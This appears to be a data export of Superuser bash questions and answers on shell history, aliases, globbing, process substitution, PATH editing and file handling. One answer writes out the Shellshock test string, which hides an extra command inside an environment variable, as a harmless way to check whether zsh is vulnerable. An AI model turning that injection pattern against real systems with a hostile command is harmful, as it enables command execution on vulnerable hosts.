"Is there a “reverse incremental search” functionality in Fish similar to Bash’s CTRL+R?","627929","<bash><fish>","40","<p>I've never used <code>fish</code> myself but a cursory google search brought up <a href=""http://lwn.net/Articles/136232/"" rel=""noreferrer"">this page</a> which states that</p>
<blockquote>
<p><strong>Powerful History Mechanism</strong></p>
<p>Modern shells save previous commands in a command history. You can view earlier commands by using the up and down arrows. Fish extends this concept by integrating the history search functionality. To search the history, simply type in the search string, and press the up arrow. By using the up and down arrow, you can search for older and newer matches. The fish history automatically removes duplicate matches and the matching substring is highlighted. These features make searching and reusing previous commands much faster.</p>
</blockquote>
<p>Is that what you are looking for? It seems quite similar to bash's.</p>
"
"How can I pass an alias to sudo?","1220872","<bash><sudo><alias>","40","<p>Ironically, the solution is to call <code>sudo</code> from an alias. </p>

<pre><code>alias sd=""sudo ""
</code></pre>

<p>Note: While not recommended, you could name the alias <code>sudo</code>: <code>alias sudo=""sudo ""</code></p>

<blockquote>
  <p><a href=""https://www.gnu.org/software/bash/manual/bashref.html#Aliases"" rel=""nofollow noreferrer"">Bash Reference Manual (Aliases)</a></p>
  
  <p>If the last character of the alias value is a blank, then the next
  command word following the alias is also checked for alias expansion. </p>
</blockquote>
"
"Bash Shebang for dummies?","195826","<bash><shell><script>","40","<p>If a script <code>/path/to/foo</code> begins with <code>#!/bin/bash</code>, then executing <code>/path/to/foo arg1 arg2</code> is equivalent to executing <code>/bin/bash /path/too/foo arg1 arg2</code>. If the shebang line is <code>#!/bin/bash -ex</code>, it is equivalent to executing <code>/bin/bash -ex /path/too/foo arg1 arg2</code>. This feature is managed by the kernel.</p>

<p>Note that you can portably have only one argument on the shebang line: some unices (such as Linux) only accept one argument, so that <code>#!/bin/bash -e -x</code> would lead to bash receiving the single five-character argument <code>-e -x</code> (a syntax error) rather than two arguments <code>-e</code> and <code>-x</code>.</p>

<p>For the Bourne shell <code>sh</code> and derived shells such as POSIX sh, bash, ksh, and zsh:</p>

<ul>
<li><code>-e</code> means that if any command fails (which it indicates by returning a nonzero status), the script will terminate immediately.</li>
<li><code>-x</code> causes the shell to print an execution trace.</li>
</ul>

<p>Other programs may understand these options but with different meanings.</p>
"
"Why doesn't echo support ""\e"" (escape) when using the -e argument in MacOSX","33914","<macos><command-line><osx-snow-leopard><bash>","39","<p>I cannot tell you why it does not support that argument (you may have to ask the programmers about that).
I only know that on my linux box, I get this:</p>

<pre><code>$ /bin/echo --help
Usage: /bin/echo [SHORT-OPTION]... [STRING]...
  or:  /bin/echo LONG-OPTION
Echo the STRING(s) to standard output.

  -n             do not output the trailing newline
  -e             enable interpretation of backslash escapes
  -E             disable interpretation of backslash escapes (default)
      --help     display this help and exit
      --version  output version information and exit

If -e is in effect, the following sequences are recognized:
*emphasized text*
  \0NNN   the character whose ASCII code is NNN (octal)
  \\     backslash
  \a     alert (BEL)
  \b     backspace
  \c     produce no further output
  \f     form feed
  \n     new line
  \r     carriage return
  \t     horizontal tab
  \v     vertical tab

NOTE: your shell may have its own version of echo, which usually supersedes
the version described here.  Please refer to your shell's documentation
for details about the options it supports.

Report echo bugs to bug-coreutils@gnu.org
GNU coreutils home page: &lt;http://www.gnu.org/software/coreutils/&gt;
General help using GNU software: &lt;http://www.gnu.org/gethelp/&gt;
Report echo translation bugs to &lt;http://translationproject.org/team/&gt;
</code></pre>

<ul>
<li>this does not mention <code>\e</code> escapes</li>
<li>it says that it is <code>/bin/echo</code> from gnu coreutils. As apple changes the source of their unix-system components from time to time (e.g. move from zsh to bash), check if there was a change for <code>/bin/echo</code> between Leopard and Snow Leopard. If it is gnu, you can ask the people at gnu.org why they choose not to include those sequences.</li>
</ul>

<p>As for workarounds (thats more interesting):
Not using <code>/bin/echo</code>, but bash's builtin <code>echo</code> works on linux boxes. If they changed to a bash without builtin echo (or something even more obscure), you could also try this not widely known feature of your shell (works at least in bash and zsh):</p>

<pre><code>$ echo $'\e[34m''COLORS'
</code></pre>

<p>This is the matching part of bash's manpage:</p>

<pre><code>   Words  of  the  form  $'string' are treated specially.  The word expands to string, with
   backslash-escaped characters replaced as specified by the ANSI  C  standard.   Backslash
   escape sequences, if present, are decoded as follows:
          \a     alert (bell)
          \b     backspace
          \e     an escape character
          \f     form feed
          \n     new line
          \r     carriage return
          \t     horizontal tab
          \v     vertical tab
          \\     backslash
          \'     single quote
          \nnn   the  eight-bit  character whose value is the octal value nnn (one to three
                 digits)
          \xHH   the eight-bit character whose value is the hexadecimal value  HH  (one  or
                 two hex digits)
          \cx    a control-x character

   The expanded result is single-quoted, as if the dollar sign had not been present.

   A  double-quoted string preceded by a dollar sign ($) will cause the string to be trans‐
   lated according to the current locale.  If the current locale is C or POSIX, the  dollar
   sign  is  ignored.  If the string is translated and replaced, the replacement is double-
   quoted.
</code></pre>
"
"Run part of a bash script as a different user","93385","<linux><bash><user>","39","<p>Use the sudo command in the script. </p>

<p>In the form:</p>

<pre><code>sudo -u username command
</code></pre>

<p>the sudo command runs <em>command</em> as the user <em>username</em>.</p>

<p>If the script is being run as root, I don't think it will prompt for a password. Otherwise, this article discusses how to use <a href=""https://superuser.com/questions/67765/sudo-with-password-in-one-command-line"">sudo with password in one command line?</a>, and this article discusses how to use <a href=""https://serverfault.com/questions/92893/sudo-without-password"">sudo without password?</a></p>
"
"Preventing bash from displaying ""Done"" when a background command finishes executing","305933","<bash>","39","<p>Run the command in a subshell:</p>

<pre><code>(sleep 2 &amp;)
</code></pre>
"
"What's an elegant way to copy the creation and modification dates of a file to another file?","437663","<linux><macos><bash>","39","<p>Type:</p>
<pre><code>touch -r FROMFILE TOFILE
</code></pre>
<p>That sets the access and modification times of TOFILE to match FROMFILE.</p>
<p>It will also update TOFILE's ctime to the current time.</p>
<p>There's no way to update the ctime (inode change time) to match another file, only to the current system time.  (Which you can change if you really need to set the ctime, or use <code>debugfs</code> on an unmounted ext2/3/4 filesystem.  See more <a href=""https://stackoverflow.com/questions/4537291/setting-creation-or-change-timestamps"">on Stack Overflow</a>)</p>
"
"How to automatically restart a linux background process if it fails?","507576","<linux><bash><process><daemon>","39","<p>The easiest way would be to add it to <a href=""http://www.computerworld.com/article/2693438/unix-how-to-the-linux-etc-inittab-file.html"" rel=""noreferrer"">/etc/inittab</a>, which is designed to do this sort of thing:</p>

<blockquote>
  <p><strong>respawn</strong>
  If the process does not exist, start the process. Do not wait for its termination (continue scanning the /etc/inittab file). Restart the process when it dies. If the process exists, do nothing and continue scanning the /etc/inittab file.</p>
</blockquote>

<p>For example, you could do this:</p>

<pre><code># Run my stuff
myprocess:2345:respawn:/bin/myprocess
</code></pre>
"
"How can I make the bash backtick operator keep newlines in output?","403800","<linux><bash>","39","<p>It's not an issue with backticks substitution, but with <code>echo</code>; you have to quote the variable to get the control characters working:</p>

<pre><code>$ var=`echo line one &amp;&amp; echo line two`
$ echo ""$var""
line one
line two
</code></pre>
"
"Does the Shellshock bug affect ZSH?","816622","<bash><zsh><shellshock>","39","<p><strong>No, it doesn't affect ZSH.</strong></p>

<p>You still <strong>MUST</strong> update bash as most of the system scripts are written for bash and vulnerable to the shellshock bug.</p>

<p>To test your ZSH do this:</p>

<pre><code>env x='() { :;}; echo vulnerable' zsh -c 'echo hello'
</code></pre>

<p>What exactly does this code do? </p>

<ol>
<li><code>env x='() { :;}; echo vulnerable'</code> creates an environment variable with known bug using command in the end of variable</li>
<li><code>zsh -c 'echo hello'</code> launches ZSH shell with simple hello (and evaluating all env variables including <em>x</em>)</li>
</ol>

<p>If you see output:</p>

<pre><code>vulnerable
hello
</code></pre>

<p>Then your ZSH is vulnerable. Mine (5.0.2) is not:</p>

<pre><code>$ env x='() { :;}; echo vulnerable' zsh -c 'echo hello'
hello
</code></pre>
"
"Copy list of files","180251","<bash><unix><cp>","39","<p>Try using xargs:</p>

<pre><code>cat list.txt | xargs -J % cp % new_folder
</code></pre>

<hr>

<p><strong>Update:</strong></p>

<p>I did this on OS X which has an different version than GNU/Linux versions. The <code>xargs</code> which comes from <a href=""http://www.gnu.org/software/findutils/"" rel=""noreferrer"">GNU findutils</a> doesn't have <code>-J</code> but it has <code>-I</code> which is similar (as Dennis Williamson pointed out in a comment). The OS X version of xargs has both <code>-I</code> and <code>-J</code> which have slightly different behaviors -- either will work for this original question.</p>

<pre><code>$ cat list.txt
one
two.txt
three.rtf

$ cat list.txt | xargs -J % echo cp % new_folder
cp one two.txt three.rtf new_folder

$ cat list.txt | xargs -I % echo cp % new_folder
cp one new_folder
cp two.txt new_folder
cp three.rtf new_folder
</code></pre>
"
"sha1sum for a directory of directories","458326","<bash><hashing>","38","<p>Thanks to <a href=""https://stackoverflow.com/questions/4410412/bash-processing-recursively-through-all-files-in-a-directory"">this SO post</a> —</p>

<pre><code>find . -type f \( -exec sha1sum ""$PWD""/{} \; \) | sha1sum
</code></pre>

<p>Warning: This code is <em>untested</em>! Edit this question if it's wrong and you can fix it; I'll approve your edit.</p>
"
"Can I do basic maths in Bash?","256023","<bash><ssh>","38","<p>Just type <code>bc</code> into the terminal. Then type all the math stuff in after that.</p>

<p><code>bc</code> stands for ""<strong>b</strong>asic <strong>c</strong>alculator"" </p>

<p>Then type <code>quit</code> and enter to exit.</p>
"
"Can history files be unified in bash?","37576","<linux><bash>","38","<p>There are two things you need to do:</p>

<ol>
<li>Insert the command <code>shopt -s histappend</code> in your <code>.bashrc</code>. This will append to the history file instead of overwriting it.</li>
<li>Also in your <code>.bashrc</code>, insert <code>PROMPT_COMMAND=""$PROMPT_COMMAND;history -a; history -n""</code> and the history file will be re-written and re-read each time bash shows the prompt.</li>
</ol>

<p>EDIT: Thanks to e-t172 for the <code>history -n</code> trick</p>
"
"List of all available man pages","207450","<linux><command-line><bash>","38","<p>Use:</p>

<pre><code>apropos .
</code></pre>

<p>or:</p>

<pre><code>man -k .
</code></pre>

<p>where <code>.</code> is a regex that means: ""any character"".</p>
"
"How to run a command after an already running, existing one finishes?","334272","<linux><bash><terminal>","38","<p>You can separate multiple commands by <code>;</code>, so they are executed sequentially, for example:</p>

<pre><code>really_long_script.sh ; echo Finished
</code></pre>

<p>If you wish to execute next program only if the script finished with return-code 0 (which usually means it has executed correctly), then:</p>

<pre><code>really_long_script.sh &amp;&amp; echo OK
</code></pre>

<p>If you want the opposite (i.e. continue only if current command has failed), than:</p>

<pre><code>really_long_script.sh || echo FAILED
</code></pre>

<p>You could run your script in a background (but beware, scripts output (<code>stdout</code> and <code>stderr</code>) would continue to go to your terminal unless you redirect it somewhere), and then <code>wait</code> for it:</p>

<pre><code>really_long_script.sh &amp;
dosomethingelse
wait; echo Finished
</code></pre>

<p>If you have already run script, you could suspend it with <code>Ctrl-Z</code>, and then execute something like:</p>

<pre><code>fg ; echo Finished
</code></pre>

<p>Where <code>fg</code> brings the suspended process to foreground (<code>bg</code> would make it run in background, pretty much like started with <code>&amp;</code>)</p>
"
"Rename a group of files with one command","8716","<unix><bash>","38","<p>Or, you could use pure bash... (except for mv, that is..)</p>

<pre><code>for file in *.htm; do mv ""$file"" ""${file%.htm}.html""; done
</code></pre>

<p>and avoid the nasty basename stuff. ;)</p>

<p>Bash has an extensive set of variable expansion options. The one used here, '%', removes the smallest matching suffix from the value of the variable. The pattern is a glob pattern, so <code>${file%.*}</code> would also work. The '%%' operator removes the largest matching suffix, and is interchangeable in the example above, as the pattern is fixed, <code>${file%%.*}.html</code> would turn a.b.htm into a.html though.</p>

<p>See the variable substition section of the bash manpage for more neat tricks. There's a lot that can be done within bash directly.</p>
"
"Writing ""tail -f"" output to another file","59497","<bash><cygwin><grep><logging>","38","<p>Buffering is the problem.</p>

<p>Do it this way,</p>

<pre>
tail -f log.txt | egrep --line-buffered 'WARN|ERROR' | tee filtered_output.txt
#                       ^^^^^^^^^^^^^^^
</pre>

<p>Confirmed to work on Cygwin too.  </p>
"
"In bash, how to sort strings with numbers in them?","79338","<linux><bash><sorting>","38","<p>Something like this might do what you want, though it takes a slightly different approach:</p>

<pre><code>pdftk $(for n in {1..18}; do echo cwcch$n.pdf; done) cat output output.pdf
</code></pre>
"
"Deleting millions of files","680119","<linux><bash><shell><find><rm>","38","<p>Quicker is not necessarily what you want. You may want to actually run <em>slower</em>, so the deletion chews up fewer resources while it's running.</p>

<p>Use <a href=""http://linux.die.net/man/1/nice"" rel=""noreferrer"">nice(1)</a> to lower the priority of a command.</p>

<pre><code>nice find . -name ""*.gif"" -delete
</code></pre>

<p>For I/O-bound processes nice(1) might not be sufficient. The Linux scheduler does take I/O into account, not just CPU, but you may want finer control over I/O priority.</p>

<pre><code>ionice -c 2 -n 7 find . -name ""*.gif"" -delete
</code></pre>

<p>If that doesn't do it, you could also add a sleep to really slow it down.</p>

<pre><code>find . -name ""*.gif"" -exec sleep 0.01 \; -delete
</code></pre>
"
"Open gnome terminal programmatically and execute commands after bashrc was executed","198015","<bash><gnome-terminal><bashrc>","37","<p>Once gnome-terminal has started bash, it's out of the loop as far as command execution is concerned: it only manages the input and output. So you'll need bash's cooperation to run something after <code>~/.bashrc</code> has been loaded.</p>

<p>First, in many cases, you don't actually need to execute commands after <code>~/.bashrc</code>. For example, opening a terminal in a particular directory can simply be done with <code>cd /foo/bar &amp;&amp; gnome-terminal</code>. You can set environment variables in a similar way: <code>VAR=value gnome-terminal</code>. (If your <code>~/.bashrc</code> overrides environment variables, you're doing it wrong: <a href=""https://superuser.com/questions/183870/difference-between-bashrc-and-bash-profile/183980#183980"">environment variable definitions belong in <code>~/.profile</code></a>)</p>

<p>To execute commands in the terminal, but before <code>~/.bashrc</code>, you can do</p>

<pre><code>gnome-terminal -x sh -c 'command1; command2; exec bash'
</code></pre>

<p>If you want to use multiple tabs, you have to use <code>-e</code> instead of <code>-x</code>. Gnome-terminal unhelpfully splits the argument of <code>-e</code> at spaces rather than executing it through a shell. Nonetheless, you can write a shell command if you make sure not to include spaces in it. At least with gnome-terminal 2.26, you can use tabs, though (replace <code>&lt;TAB&gt;</code> by a literal tab character):</p>

<pre><code>gnome-terminal -e 'sh -c command1;command2;exec&lt;TAB&gt;bash'
gnome-terminal --tab -e 'sh -c command1;&lt;TAB&gt;exec&lt;TAB&gt;bash' \
               --tab -e 'sh -c command2;&lt;TAB&gt;exec&lt;TAB&gt;bash'
</code></pre>

<p>If you do need to run commands after <code>~/.bashrc</code>, make <em>it</em> run the commands. For example, include the following code at the end of <code>~/.bashrc</code>:</p>

<pre><code>eval ""$BASH_POST_RC""
</code></pre>

<p>Then to run a some code after (really, at the end of) your bashrc:</p>

<pre><code>gnome-terminal -x sh -c BASH_POST_RC=\''command1; command2'\''; exec bash'
</code></pre>

<p>or (less heavy on the quoting)</p>

<pre><code>BASH_POST_RC='command1; command2' gnome-terminal
</code></pre>

<p>Although I don't particularly recommend doing it this way, you may be interested in the techniques mentioned in
<a href=""https://askubuntu.com/questions/5363/how-to-start-a-terminal-with-certain-text-already-input-on-the-command-line"">How to start a terminal with certain text already input on the command-line?</a>.</p>
"
"How to expand * on Bash command line","215950","<bash><autocomplete><globbing>","37","<p>You can use the <code>glob-expand-word</code> function, from man <code>bash</code>:</p>

<pre>
The word before point is treated as a pattern for pathname
expansion, and the list of matching file names is inserted,
replacing the word. If a numeric argument is supplied, an
asterisk is appended before pathname expansion.
</pre>

<p>Add something like this to your <code>~/.inputrc</code>:</p>

<pre><code>Control-x: glob-expand-word
</code></pre>

<p>So <code>$ ls *</code> followed by <kbd>Ctrl-X</kbd> will expand to <code>$ ls a b c</code>, in your example.</p>
"
"How to call bash functions","106272","<bash>","37","<p>One way to do this, that involves a bit more typing, is via the <code>source</code> command. To call a function from myFunc you could use <code>source myFunc; ls2</code> and it would output Hello World.</p>

<p>So for example, I have a file called <code>say.sh</code>:</p>

<pre><code>#!/bin/bash

function talk()
{
        echo ""hi!""
}
</code></pre>

<p>now I want to call it's <code>talk()</code> function from the command line:</p>

<pre>[john@awesome ~]$ source say.sh; talk
hi!</pre>

<p>to call it from another bash script:</p>

<pre><code>#!/bin/bash
source say.sh
talk
</code></pre>

<p>You can also put each in a separate script and add them in a directory which is in your PATH variable.</p>

<p>so for example, in one script called <code>hello</code> you'd have:</p>

<pre><code>#!/bin/bash
echo ""Hello World""
</code></pre>

<p>now put it in one of the directories in your PATH, which you can view by running <code>echo $PATH</code>. You can add another directory to your PATH if you'd like or use an existing one. Once you've copied the file there, make it executable with <code>chmod +x filename</code>.</p>
"
"How can I add a command to the Bash history without executing it?","135651","<bash><command-history>","37","<p><code>history -s</code> <em>command</em></p>
"
"how to make bash not to wrap output?","188865","<command-line><bash>","37","<p>Note that this has nothing to do with bash (once you've launched the command, bash just waits for it to finish) and everything to do with the terminal.</p>

<p>Most terminal emulators wrap at the right margin by default. But this can be turned off by using the appropriate <a href=""http://invisible-island.net/xterm/xterm.faq.html#ctlseqs_ms"" rel=""noreferrer"">control sequence</a>, if the terminal emulator supports it; then long lines are simply truncated:</p>

<pre><code>printf '\033[?7l'
ls -l /a/folder/that/contains/files/with/long/names
printf '\033[?7h'
</code></pre>
"
"Replace Symbolic Links with Files","303559","<linux><bash>","36","<p>For some definitions of ""easy"":</p>

<pre><code>#!/bin/sh
set -e
for link; do
    test -h ""$link"" || continue

    dir=$(dirname ""$link"")
    reltarget=$(readlink ""$link"")
    case $reltarget in
        /*) abstarget=$reltarget;;
        *)  abstarget=$dir/$reltarget;;
    esac

    rm -fv ""$link""
    cp -afv ""$abstarget"" ""$link"" || {
        # on failure, restore the symlink
        rm -rfv ""$link""
        ln -sfv ""$reltarget"" ""$link""
    }
done
</code></pre>

<p>Run this script with link names as arguments, e.g. through <code>find . -type l -exec /path/tos/script {} +</code></p>
"
"Custom bash tab completion","289539","<bash>","36","<p>Write a bash completion script for <code>cooltool</code>. The <a href=""http://www.caliban.org/bash/#completion"" rel=""nofollow noreferrer"">bash-completion</a> package comes with scripts for many popular programs, which you can use as examples.</p>
"
"Can I use pipe output as a shell script argument?","461946","<linux><bash><shell><pipe><arguments>","36","<p><a href=""http://tldp.org/LDP/abs/html/commandsub.html"" rel=""noreferrer"">Command substitution</a>.</p>

<pre><code>./Myscript.sh ""$(cat text.txt)""
</code></pre>
"
"Pass text to program expecting a file","939746","<linux><command-line><bash>","36","<p>Another solution is to use <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Process-Substitution"" rel=""noreferrer"">Process Substitution</a> in Bash. If your system has named pipes, you can use this feature.</p>

<p>It is used like this:</p>

<pre><code>program_expecting_a_file &lt;(list)
</code></pre>

<p>where <code>list</code> is a sequence of shell commands (actually pipelines; the full details are <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Lists"" rel=""noreferrer"">here</a>). <code>list</code> will be executed, and its output will be connected to the pipe. The name of the pipe is then passed to your program.</p>

<p><strong>NOTE:</strong> spaces are not allowed between <code>&lt;</code> and <code>(</code>.</p>

<p>(The other substitution <code>&gt;(list)</code> also works as you'd expect.)</p>

<p><strong>In your specific case,</strong> you could use</p>

<pre><code>program_expecting_a_file &lt;(echo ""$your_strings"")
</code></pre>

<p>although you may find @meuh's solution to be more elegant.</p>

<p><strong>Update:</strong> A great many usage examples are to be found over at the <a href=""http://tldp.org/LDP/abs/html/process-sub.html"" rel=""noreferrer"">Advanced Bash Scripting Guide</a>.</p>
"
"bash: how to pass command line arguments containing special characters","163515","<linux><command-line><bash><special-characters>","36","<p>You can either:</p>

<ol>
<li>Escape each single special symbol with a backslash (as in <code>\[abc\]_\[x\|y\]</code>) or</li>
<li>Double-quote the entire argument (as in <code>""[abc]_[x|y]""</code>).</li>
</ol>

<p><strong>EDIT:</strong> As <a href=""https://superuser.com/questions/163515/bash-how-to-pass-command-line-arguments-containing-special-characters#comment866278_163521"">some</a> have pointed out, double-quoting does not prevent variable expansion nor command substitution. Therefore if your regex contains something that can be interpreted by bash as one of those, <a href=""https://superuser.com/questions/163515/bash-how-to-pass-command-line-arguments-containing-special-characters#349036"">use single quotes</a> instead.</p>
"
"Use ""cd -"" without any output","593694","<bash>","36","<p>Try it like this:</p>

<pre><code>cd - &gt; /dev/null
</code></pre>

<p>You can also do:</p>

<pre><code>cd - &gt; uselessfile
</code></pre>

<p>This will send the output to the ""uselessfile"" file instead of to STDOUT. </p>

<p>You can also append instead of creating or overwriting the file.</p>

<pre><code>cd - &gt;&gt; uselessfile
</code></pre>
"
"Unable to change file permissions on Ubuntu Bash for Windows 10","1323645","<windows-10><ubuntu><bash><ssh><windows-subsystem-for-linux>","36","<p>If you're referencing files in the Windows file system, they do not, by default, retain Linux permissions.
However, there's a way to enable that. Edit or create (using <code>sudo</code>) <code>/etc/wsl.conf</code> and add the following:</p>

<pre><code>[automount]
options = ""metadata""
</code></pre>

<p>Shut down all WSL instances and restart an instance, and any <code>chmod</code> changes are now retained.</p>
"
"Extract/save a mail attachment using bash","187106","<linux><bash><attachments><email>","36","<p>If you're aiming for portability, beware that there are several different versions of <code>mail(1)</code> and <code>mailx(1)</code>. There's a POSIX <code>mailx</code> command, but with very few requirements. And none of the implementations I have seem to parse attachments anyway.</p>

<p>You might have the <a href=""http://ftp.andrew.cmu.edu/pub/mpack/"">mpack package</a>. Its <code>munpack</code> command saves all parts of a MIME message into separate files, then all you have to do is save the interesting parts and clean up the rest.</p>

<p>There's also <a href=""ftp://ftp.research.telcordia.com/pub/nsb/mm2.7.tar.Z"">metamail</a>. An equivalent of <code>munpack</code> is <code>metamail -wy</code>.</p>
"
"Why must a folder be executable?","168578","<linux><bash>","36","<p>Since you can't 'execute' a directory, the execute bit has been put to better use. The execute bit on a directory allows you to access items that are inside the directory, even if you cannot list the directories contents.</p>

<pre><code>$ mkdir -p dir/
$ echo 'Hello World!' &gt; dir/file
$ chmod 000 dir/
$ ls -al dir/
ls: cannot open directory dir: Permission denied
$ cat dir/file
cat: dir/file: Permission denied
$ chmod +x dir/
$ ls -al dir/
ls: cannot open directory dir: Permission denied
$ cat dir/file
Hello World!
</code></pre>

<hr>

<p>From the <code>chmod</code> manpage:</p>

<blockquote>
  <p>The letters rwxXst select file mode bits for the affected users: read (r), write (w), <strong>execute (or search for directories) (x)</strong>, execute/search only if the file is a directory or already has execute permission for some user (X), set user or group ID on execution (s), restricted deletion flag or sticky bit (t).</p>
</blockquote>
"
"Change DNS Server From Terminal (or script) on Mac OS X","86184","<macos><bash><dns>","35","<p>You can use <code>scutil</code> interactively from the terminal. Run <code>sudo scutil</code> and run these commands, swapping your DNS servers in where appropriate:</p>

<pre>> open
> d.init
> d.add ServerAddresses * 8.8.8.8 9.9.9.9
> set State:/Network/Service/PRIMARY_SERVICE_ID/DNS
> quit</pre>

<p>Instead of using <code>8.8.8.8</code> and <code>9.9.9.9</code> use your DNS servers.</p>

<p>The only problem is this is <strong>not persistent across reboots</strong>. If you want permanent changes, you'll want <a href=""http://turin.nss.udel.edu/ncutil/"" rel=""noreferrer"">ncutil</a>. The reason editing <code>/etc/resolv.conf</code> isn't sufficient in newer versions of OS X is because configd now uses a database to store information of current settings, which other applications read. Certain applications <strong>will still read</strong> <code>/etc/resolv.conf</code> (host for example), although that is not the case for all applications.</p>
"
"Undo tar file extraction mess","424774","<linux><bash><tar><undo>","35","<pre><code>tar tf archive.tar
</code></pre>

<p>will list the contents line by line.</p>

<p>This can be piped to <code>xargs</code> directly, but <strong>beware</strong>: do the deletion very carefully. You <strong>don't</strong> want to just <code>rm -r</code> everything that <code>tar tf</code> tells you, since it might include directories that were not empty before unpacking!</p>

<p>You could do</p>

<pre><code>tar tf archive.tar | xargs -d'\n' rm -v
tar tf archive.tar | sort -r | xargs -d'\n' rmdir -v
</code></pre>

<p>to first remove all files that were in the archive, and then the directories that are left empty.</p>

<p><code>sort -r</code> (glennjackman suggested <code>tac</code> instead of <code>sort -r</code> in the comments to the accepted answer, which also works since <code>tar</code>'s output is regular enough) is needed to delete the deepest directories first; otherwise a case where <code>dir1</code> contains a single empty directory <code>dir2</code> will leave <code>dir1</code> after the <code>rmdir</code> pass, since it was <em>not</em> empty before <code>dir2</code> was removed.</p>

<p>This will generate a lot of </p>

<pre><code>rm: cannot remove `dir/': Is a directory
</code></pre>

<p>and</p>

<pre><code>rmdir: failed to remove `dir/': Directory not empty
rmdir: failed to remove `file': Not a directory
</code></pre>

<p>Shut this up with <code>2&gt;/dev/null</code> if it annoys you, but I'd prefer to keep as much information on the process as possible.</p>

<p>And don't do it until you are sure that you match the right files. And perhaps try <code>rm -i</code> to confirm everything. And have backups, eat your breakfast, brush your teeth, etc.</p>
"
"""watch"" the output of a command until a particular string is observed and then exit","375223","<linux><bash>","35","<p>Use a loop:</p>

<pre><code>until my_cmd | grep -m 1 ""String Im Looking For""; do : ; done
</code></pre>

<p>Instead of <code>:</code>, you can use <code>sleep 1</code> (or 0.2) to ease the CPU.</p>

<p>The loop runs until grep finds the string in the command's output. <code>-m 1</code> means ""one match is enough"", i.e. grep stops searching after it finds the first match.</p>

<p>You can also use <code>grep -q</code> which also quits after finding the first match, but without printing the matching line.</p>
"
"What does the builtin command do in bash?","1241654","<bash>","35","<p>The <code>builtin</code> command makes sure you run the shell built-in version of the command rather than running another command with the same name. </p>

<p>For example, let's say you defined a shell function named <code>cd</code> to print some extra status everytime you change directories. But you messed it up and now you can't change directories correctly. So now you can type <code>builtin cd ~</code> to successfully cd back to your home directory without running your broken shell function. </p>

<p>And by the way, my copy of the bash man page has a section called ""SHELL BUILTIN COMMANDS"", and it defines the meaning of the <code>builtin</code> command in that section (transcribed below).</p>

<pre>
builtin shell-builtin [arguments]

    Execute  the  specified  shell builtin, passing it arguments, and
    return its exit status.  This is useful when defining a function
    whose name  is the  same as a shell builtin, retaining the
    functionality of the builtin within the function.  The cd builtin is
    commonly  redefined  this  way.

    The  return status is false if shell-builtin is not a shell builtin
    command.
</pre>
"
"A more comfortable way to edit a long $PATH?","1000867","<linux><bash><unix><path>","35","<p>I use a set of convenience functions for prepending or appending a path to a variable. The functions come in the distribution tarball for Bash in a contrib file called ""pathfuncs"".</p>

<ul>
<li>add_path will add the entry to the end of the PATH variable</li>
<li>pre_path will add the entry to the beginning of the PATH variable</li>
<li>del_path will remove the entry from the PATH variable, wherever it is</li>
</ul>

<p>If you specify a variable as the second argument, it will use that instead of PATH.</p>

<p>For convenience, here they are:</p>

<pre><code># is $1 missing from $2 (or PATH) ?
no_path() {
    eval ""case :\$${2-PATH}: in *:$1:*) return 1;; *) return 0;; esac""
}
# if $1 exists and is not in path, append it
add_path () {
  [ -d ${1:-.} ] &amp;&amp; no_path $* &amp;&amp; eval ${2:-PATH}=""\$${2:-PATH}:$1""
}
# if $1 exists and is not in path, prepend it
pre_path () {
  [ -d ${1:-.} ] &amp;&amp; no_path $* &amp;&amp; eval ${2:-PATH}=""$1:\$${2:-PATH}""
}
# if $1 is in path, remove it
del_path () {
  no_path $* || eval ${2:-PATH}=`eval echo :'$'${2:-PATH}: |
    sed -e ""s;:$1:;:;g"" -e ""s;^:;;"" -e ""s;:\$;;""`
}
</code></pre>

<p>If you add those to your bash startup file, you can add to your PATH like this:</p>

<pre><code>pre_path $HOME/bin
add_path /sbin
add_path /usr/sbin
</code></pre>

<p>Or specify a different variable:</p>

<pre><code>pre_path $HOME/man MANPATH
pre_path $HOME/share/man MANPATH
add_path /usr/local/man MANPATH
add_path /usr/share/man MANPATH
</code></pre>

<p>I use this method in my rc files putting the pre_paths first and the add_paths second. It makes all of my path changes easy to understand at a glance. Another benefit is that the lines are short enough that I can add a trailing comment on a line if necessary.</p>

<p>And since these are functions, you can use them interactively from the command line, such as by saying <code>add_path $(pwd)</code> to add the current directory to the path.</p>
"
"Putty SSH: CTRL+Cursor keys don't work skip to previous/next word","103069","<ubuntu><bash><shell><putty><inputrc>","35","<p>Add these two lines to your <code>~/.inputrc</code> file on the destination machine:</p>

<pre><code>""\eOD"": backward-word
""\eOC"": forward-word
</code></pre>

<p>To make sure that they are the correct sequences, at a Bash prompt, type <kbd>Ctrl</kbd>-<kbd>V</kbd> <kbd>Ctrl</kbd>-<kbd>LeftArrow</kbd> and <kbd>Ctrl</kbd>-<kbd>V</kbd> <kbd>Ctrl</kbd>-<kbd>RightArrow</kbd>, you should see:</p>

<pre><code>^[OD^[OC
</code></pre>

<p>When you start a new session, the keys will be available or you can press <kbd>Ctrl</kbd>-<kbd>x</kbd><kbd>Ctrl</kbd>-<kbd>r</kbd> to re-read the <code>~/.inputrc</code> file for the current session.</p>
"
": colon command for bash","423980","<bash>","35","<p><code>:</code> is a shell builtin that is basically equivalent to the <code>true</code> command. It is often used as a no-op eg after an <code>if</code> statement. You can read more about it in <a href=""https://stackoverflow.com/questions/3224878/what-is-the-purpose-of-the-colon-gnu-bash-builtin"">this question from stack overflow</a>.</p>

<p>The <code>${varname=value}</code> basically means set the value of <code>$varname</code> to <code>value</code> if <code>$varname</code> is not already set, and then return the value of $varname. Though if you try to run that at the command line it will try to run the value returned. Putting the <code>:</code> in front as a no-op prevents bash from trying to run the value.</p>

<p>Note there are two slightly different forms:</p>

<pre><code>${varname:=value}
</code></pre>

<p>sets varname to value if varname is either unset or null. </p>

<pre><code>${varname=value}
</code></pre>

<p>only sets the value of varname if varname is currently unset (i.e., it will not change varname from """" to value)</p>

<p>(Thank you to chepner for clarifying that in a comment).</p>

<p><a href=""http://www.cyberciti.biz/tips/howto-setting-default-values-for-shell-variables.html"" rel=""noreferrer"">Someone else referencing this method</a></p>
"
"How to get the full path of a file in bash?","202645","<command-line><bash>","35","<p>On linux systems, you should have <code>readlink</code> from the GNU coreutils project installed and can do this:</p>

<pre><code>readlink -f file.ext
</code></pre>

<p>Debian/ubuntu systems may have the <a href=""http://packages.debian.org/sid/realpath"">realpath</a> utility installed which ""provides mostly the same functionality as <code>/bin/readlink -f</code> in the coreutils package.""</p>
"
